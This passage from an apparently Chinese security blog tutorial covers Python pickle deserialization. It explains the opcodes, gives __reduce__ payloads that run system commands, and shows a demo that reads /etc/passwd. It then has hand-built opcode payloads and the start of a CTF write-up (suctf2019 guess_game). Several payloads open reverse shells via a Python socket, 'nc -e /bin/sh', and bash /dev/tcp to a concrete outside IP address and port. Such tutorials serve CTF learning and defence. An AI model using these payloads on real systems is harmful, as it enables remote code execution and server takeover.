d>空字典入栈</td><td>无</td></tr><tr><td>b’p’</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>b’g’</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>b’0’</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b’b’</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>b’s’</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>b’u’</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>b’a’</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>b’e’</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><h2 id="反序列化流程"><a href="#反序列化流程" class="headerlink" title="反序列化流程"></a>反序列化流程</h2><p>序列化是一个将对象转化成字符串的过程，而反序列化就是将字符串转换为对象的过程。</p><p>例如对于字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">c__builtin__<br>file<br>(S<span class="hljs-string">&#x27;/etc/passwd&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure><p>首先<code>c</code>操作码代表引入模块和对象<code>__builtin__.file</code></p><p><img src="/wzimg/118.png" alt="a"></p><p>然后<code>(</code>操作码代表压入一个标志到栈中，表示元组的开始位置</p><p><img src="/wzimg/119.png" alt="a"></p><p>接着<code>S</code>操作码代表向栈顶插入一个字符串，这里为’/etc/passwd’。</p><p><img src="/wzimg/120.png" alt="a"></p><p><code>t</code>操作码代表从栈顶开始，找到最上面的<code>MARK</code>也就是<code>(</code>，并将<code>(</code>到<code>t</code>中间的内容全部弹出，组成一个元组，再把这个元组压入栈中。</p><p><img src="/wzimg/121.png" alt="a"></p><p>最后<code>R</code>操作码代表从栈顶弹出两个元素，一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上。这里执行的是<code>__builtin__.file(&#39;/etc/passwd&#39;)</code></p><p><img src="/wzimg/122.png" alt="a"></p><p>最后还要有一个<code>.</code>代表整个程序结束。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickle<br><span class="hljs-meta">&gt;&gt;&gt; </span>a = <span class="hljs-string">&#x27;&#x27;&#x27;c__builtin__</span><br><span class="hljs-string"><span class="hljs-meta">... </span>file</span><br><span class="hljs-string"><span class="hljs-meta">... </span>(S&#x27;/etc/passwd&#x27;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>tR.</span><br><span class="hljs-string"><span class="hljs-meta">... </span>&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pickle.loads(a)<br>&lt;<span class="hljs-built_in">open</span> file <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>, mode <span class="hljs-string">&#x27;r&#x27;</span> at <span class="hljs-number">0x7f488f6010c0</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>pickle.loads(a).read()<br><span class="hljs-string">&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">/bin:/bin</span><br></code></pre></td></tr></table></figure><h2 id="生成pickle"><a href="#生成pickle" class="headerlink" title="生成pickle"></a>生成pickle</h2><h3 id="reduce-方法："><a href="#reduce-方法：" class="headerlink" title="__reduce__方法："></a>__reduce__方法：</h3><p>本质在于序列化对象的时候，类中自动执行的函数（如 <code>__reduce__</code>）也被序列化，而且在反序列化时候该函数会直接被执行。</p><p>漏洞产生的原因在于pickle可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__</code>方法从而触发恶意代码，类似与PHP中的<code>__wakeup__</code>，在反序列化的时候会自动调用。</p><p><code>__reduce__()</code> 是一个二元操作函数，第一个参数是函数名，第二个参数是第一个函数的参数数据结构。<code>__reduce__</code> 方法被定义后，当对象被反序列化时就会被自动调用。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 导入os模块执行命令</span><br>        <span class="hljs-keyword">return</span>(os.system,(<span class="hljs-string">&#x27;ls&#x27;</span>,))<br>        <span class="hljs-comment"># return(os.system,(&#x27;ls&#x27;,))</span><br>        <span class="hljs-comment"># return(eval,(&quot;os.system(&#x27;ls&#x27;)&quot;,))</span><br>        <span class="hljs-comment"># return(map,(os.system, (&#x27;ls&#x27;,)))</span><br>        <span class="hljs-comment"># return(eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;,))</span><br>        <br>a = Exp()<br>test = pickle.dumps(a)<br>pickle.loads(test)<br></code></pre></td></tr></table></figure><p>即可执行ls命令</p><p>还可以反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        shell = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span>(os.system,(shell,))    <br>a=Exp()<br>result = pickle.dumps(a)<br>pickle.loads(result)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc IP地址 9999 -e/bin/sh&#x27;)&quot;</span>,))<span class="hljs-comment">#9999端口</span><br>a = A()<br><span class="hljs-built_in">print</span>( base64.b64encode( pickle.dumps(a) ) )<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.110.124.239/2333 0&gt;&amp;1\&quot;&#x27;)&quot;</span>,))<br>poc = A()<br>result = pickle.dumps(poc)<br>result = base64.b64encode(result)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><code>pickle.loads()</code> 是会自动解决 import 问题的，对于未引入的 <code>module</code> 会自动尝试 <code>import</code>。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用</p><h3 id="手写："><a href="#手写：" class="headerlink" title="手写："></a>手写：</h3><p>很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。</p><p><code>opcode</code>解析如下：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>03c__main__<span class="hljs-symbol">\n</span>animal<span class="hljs-symbol">\n</span>q<span class="hljs-symbol">\x</span>00)<span class="hljs-symbol">\x</span>81q<span class="hljs-symbol">\x</span>01&#125;q<span class="hljs-symbol">\x</span>02X<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00animalq<span class="hljs-symbol">\x</span>03X<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00dogq<span class="hljs-symbol">\x</span>04sb.&#x27;<br></code></pre></td></tr></table></figure><p>第一步：读取到<code>\x80</code>，通过dispatch字典索引，调用load_proto方法，程序继续读取一个字节，读取到<code>\x03</code>，它的意思是：这是一个根据三号协议序列化的字符串。</p><p>第二步：读取到<code>c</code> (GLOBAL操作码) ，程序往前读取两行字符串，获取域名空间与类名<code>module=__main__,name=animal</code>，调用find_class函数获取到animal对象，并压入栈stack中。</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">stack:<span class="hljs-meta">[&lt;class &#x27;__main__.animal&#x27;&gt;]</span><br></code></pre></td></tr></table></figure><p>第三步：读取到<code>q</code>（binput操作码），继续读取下一个字节为0，对应的操作为：将stack中栈尾的数据保存到memo字典中的0号位置(可以理解为逐步保存stack中的数据，方便之后调用)。</p><p>第四步：读取到<code>)</code>（EMPTY_TUPLE操作码），往栈中压入空的元组。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">stack:</span>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-comment">&#x27;__main__.animal&#x27;&gt;,()]</span><br></code></pre></td></tr></table></figure><p>第五步：读取到<code>\x81</code>（NEW_OBJ），弹出<code>()</code>赋值给args，然后再弹出<code>&lt;class &#39;__main__.animal&#39;&gt;</code>赋值给cls，在这里是animal对象，之后用<code>cls.__new__(cls,*args)</code>实例化该对象并压入栈中，在这里args为空，所以栈中任然是一个空的animal对象。</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">stack:<span class="hljs-meta">[&lt;class &#x27;__main__.animal&#x27;&gt;]</span><br></code></pre></td></tr></table></figure><p>第六步：读取到<code>q\x01</code>将上面实例化的对象保存到memo[1]中。</p><p>第七步：读取到<code>&#125;</code>，往栈中压入空的字典。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">stack:</span>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-comment">&#x27;__main__.animal&#x27;&gt;,&#123;&#125;]</span><br></code></pre></td></tr></table></figure><p>第八步：读取到<code>q\x02</code>将该字典存到memo[2]中。</p><p>第九步：读取到<code>X</code>继续向前读取四个字节代表字符串长度，<code>\x06\x00\x00\x00</code>获得字符串长度为6，接着继续往后读取六个字符<code>animal</code>，存入栈中。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">stack:[&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">__main__</span>.<span class="hljs-title">animal</span>&#x27;&gt;,<span class="hljs-type">&#123;&#125;</span>,<span class="hljs-type">animal]</span></span><br></code></pre></td></tr></table></figure><p>第九步：读取到<code>q\x03</code>将上面的字符串保存到memo[3]中。</p><p>第十步：继续向前提取出<code>dog</code>并保存到memo[4]中。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">stack:[&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">__main__</span>.<span class="hljs-title">animal</span>&#x27;&gt;,<span class="hljs-type">&#123;&#125;</span>,<span class="hljs-type">animal</span>,<span class="hljs-type">dog]</span></span><br></code></pre></td></tr></table></figure><p>第十一步：读取到<code>s</code>(SETITEM操作符)，弹出数据作为值，再弹出数据作为健，最后弹出一个数据 (一定要是字典类型) ，以键值对的形式将数据存入该字典中，{‘animal’:’dog’}`,并入栈。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">stack:[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.animal&#x27;</span>&gt;,&#123;<span class="hljs-string">&#x27;animal&#x27;</span>:<span class="hljs-string">&#x27;dog&#x27;</span>&#125;]<br></code></pre></td></tr></table></figure><p>第十二步：读取到<code>b</code>(BUILD操作符)，从栈中弹出字典类型的数据赋值给state，弹出<code>&lt;class &#39;__main__.animal&#39;&gt;</code>赋值给inst,如果inst中存在<code>__setstate__</code>方法，则直接用setstate来处理state<code>setstate(state)</code>，如果不存在，则直接将state存入<code>inst.__dict__</code>中。</p><p>第十三步：读取到<code>.</code>，结束反序列化。</p><p>基本模式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">c&lt;module&gt;<br>&lt;<span class="hljs-built_in">callable</span>&gt;<br>(&lt;args&gt;<br>tR<br></code></pre></td></tr></table></figure><p>看个小例子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">cos<br>system<br>(S<span class="hljs-string">&#x27;ls&#x27;</span><br>tR.<br><br>&lt;=&gt; __import__(&#x27;os&#x27;).system(*(&#x27;ls&#x27;,))<br><br><span class="hljs-comment"># 分解一下：</span><br>cos<br>system  =&gt;  引入 system，并将函数添加到 stack<br><br>(S&#x27;ls&#x27;  =&gt;  把当前 stack 存到 metastack，清空 stack，再将 &#x27;ls&#x27; 压入 stack<br>t       =&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack<br><span class="hljs-comment"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, (&#x27;ls&#x27;,)]</span><br>R       =&gt;  system(*(&#x27;ls&#x27;,))<br>.       =&gt;  结束，返回当前栈顶元素<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickle<br><span class="hljs-meta">&gt;&gt;&gt; </span>a = <span class="hljs-string">&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string"><span class="hljs-meta">... </span>system</span><br><span class="hljs-string"><span class="hljs-meta">... </span>(S&#x27;ls&#x27;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>tR.</span><br><span class="hljs-string"><span class="hljs-meta">... </span>&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>b = pickle.loads(a)<br>公共  图片  音乐           flag.txt       redis-<span class="hljs-number">2.8</span><span class="hljs-number">.3</span>         yum-<span class="hljs-number">3.2</span><span class="hljs-number">.28</span><br>模板  文档  桌面           phpggc-master  redis-<span class="hljs-number">2.8</span><span class="hljs-number">.3</span>.tar.gz  yum-<span class="hljs-number">3.2</span><span class="hljs-number">.28</span>.tar.gz<br>视频  下载  CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>  python         test                yum.conf<br></code></pre></td></tr></table></figure><p>关于函数执行</p><p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：(里面有自己错误的理解，只是为了方便理解)</p><ol><li><code>R</code>操作码 ：</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;cos   #c:引入os包</span><br><span class="hljs-string">system   #栈上第一个对象</span><br><span class="hljs-string">(S&#x27;whoami&#x27;   #S:实例一个字符串对象</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span>   <span class="hljs-comment">#R:让栈上第一个对象为函数，第二个对象为参数并执行</span><br></code></pre></td></tr></table></figure><ol><li><code>i</code> 操作码：</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios   #i:先获取全局函数system，再在栈上获取数据S作为参数执行</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ol><li><code>o</code> 操作码：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&#39;&#39;&#39;(cos<br>system<br>S&#39;whoami&#39;<br>o.&#39;&#39;&#39;   #o:让第一个数据（必须是函数）作为函数，再让后面的作为参数执行<br></code></pre></td></tr></table></figure><p>关于变量覆盖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs opcode">opcode&#x3D;&#39;&#39;&#39;c__main__<br>secret<br>(S&#39;name&#39;<br>S&#39;1&#39;<br>db.&#39;&#39;&#39;<br></code></pre></td></tr></table></figure><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="suctf2019-guess-game"><a href="#suctf2019-guess-game" class="headerlink" title="suctf2019_guess_game"></a>suctf2019_guess_game</h4><p>猜数游戏，10 以内的数字，猜对十次就返回 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># file: Ticket.py</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ticket</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, number</span>):</span><br>        self.number = number<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-params">self, other</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) == <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">and</span> self.number == other.number:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(self.number) == <span class="hljs-built_in">int</span><br><br>        <span class="hljs-keyword">if</span> number_range &gt;= self.number &gt;= <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br><br>        <br><span class="hljs-comment"># file: game_client.py</span><br>number = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input the number you guess\n&gt; &#x27;</span>)<span class="hljs-comment"># 输入数字</span><br>ticket = Ticket(number)<span class="hljs-comment"># 新建ticket对象</span><br>ticket = pickle.dumps(ticket)<br>writer.write(pack_length(<span class="hljs-built_in">len</span>(ticket)))<span class="hljs-comment">#上传长度</span><br>writer.write(ticket)<span class="hljs-comment">#上传ticket对象</span><br><span class="hljs-comment">#client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。</span><br><br><br><br><span class="hljs-comment"># file: game_server.py</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> game.finished():<br>        length = stdin_read(<span class="hljs-number">4</span>)<span class="hljs-comment">#接收长度</span><br>        length, = read_length(length)<br><br>        ticket = stdin_read(length)<span class="hljs-comment">#按长度接收数据</span><br>        ticket = restricted_loads(ticket)<span class="hljs-comment">#利用安全措施反序列化数据</span><br><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(ticket) == Ticket<span class="hljs-comment">#判断传过来的是不是ticket类型</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ticket.is_valid():<span class="hljs-comment">#判断number是不是int</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;The number is invalid.&#x27;</span>)<br>            game.next_game(Ticket(-<span class="hljs-number">1</span>))<br>            <span class="hljs-keyword">continue</span><br><br>        win = game.next_game(ticket)<span class="hljs-comment">#判断是否猜对</span><br>        <span class="hljs-keyword">if</span> win:<br>            text = <span class="hljs-string">&quot;Congratulations, you get the right number!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            text = <span class="hljs-string">&quot;Wrong number, better luck next time.&quot;</span><br>        <span class="hljs-built_in">print</span>(text)<br><br>    <span class="hljs-keyword">if</span> game.is_win():<span class="hljs-comment">#判断是否胜利，判断ticket.number是否相等，相等就使 win_count+1</span><br>        text = <span class="hljs-string">&quot;Game over! You win all the rounds, here is your flag %s&quot;</span> % get_flag()<br>    <span class="hljs-keyword">else</span>:<br>        text = <span class="hljs-string">&quot;Game over! You got %d/%d.&quot;</span> % (game.win_count, game.round_count)<br>    <span class="hljs-built_in">print</span>(text)<br>    <br>    <br> <span class="hljs-comment"># file: RestrictedUnpickler.py  对引入的模块进行检测</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>        <span class="hljs-comment"># Only allow safe classes</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;guess_game&quot;</span> == module[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restricted_loads</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br></code></pre></td></tr></table></figure><p><code>server</code>端将接收到的数据进行反序列，这里与常规的<code>pickle.loads</code>不同，采用的是<code>Python</code>提供的<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals">安全措施</a>。也就是说，导入的模块只能以<code>guess_name</code>开头，并且名称里不能含有 __。</p><p>胜利条件如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># file: Game.py</span><br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> guess_game.Ticket <span class="hljs-keyword">import</span> Ticket<br><span class="hljs-keyword">from</span> guess_game <span class="hljs-keyword">import</span> max_round, number_range<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span>:</span><br>    <span class="hljs-function"><span 